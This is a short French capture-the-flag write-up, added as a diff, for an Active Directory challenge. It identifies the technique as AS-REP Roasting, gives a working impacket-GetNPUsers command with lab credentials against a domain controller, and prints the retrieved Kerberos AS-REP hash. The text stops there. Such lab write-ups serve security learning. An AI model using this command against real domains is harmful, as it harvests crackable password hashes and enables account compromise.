@@ -1,0 +1,12 @@
+Chall 3 AD :
+
+Ici le sujet indique Pre-Auth-Opsy une attaque connue sur le pre-auth
+est la méthode d'attaque sur AS-REP qui correspond au a la
+préauthentification Kerberos : AS-REP Roasting
+
+donc on cherche à lister les comptes sans pre auth :
+
+`impacket-GetNPUsers mh.local/svc_ctf:cookies -dc-ip 192.168.1.1 -request`
+
+on trouve
+`$krb5asrep$23$svc_mh@MH.LOCAL:10382d67ca3f2498aaf22eac0186b411$fad3a7cabf04438a2c06825b6d5a831a13b0b7a5ccb3714894dae9c23a79849abbe0012bff069033cd6ac8a4caef1a56893f073b4f859bfb7d532300bc7678364287b71e5a19f1e446d9174a55086999b4f874a17e55772ed4ef206ce2fdf7d3590a7e5058d9002322a8a6d9d3fb54f0bda2f484bda0f33461ab6fd4887ab6e9f606350b388e9bc9dcc35e0fc3b7a07c3c84c14c91bb92983ca0f1be10223e74d8510c34930ca78208bec3311cb91f015ca0f619ad7acc2eac38b514584c81b556df1ce750940d22ddc91cffb69eac24b2d3def22b95f6fb6cb6847429b84463db1bfb65d70ccc404aae0041834065416b36cb66`
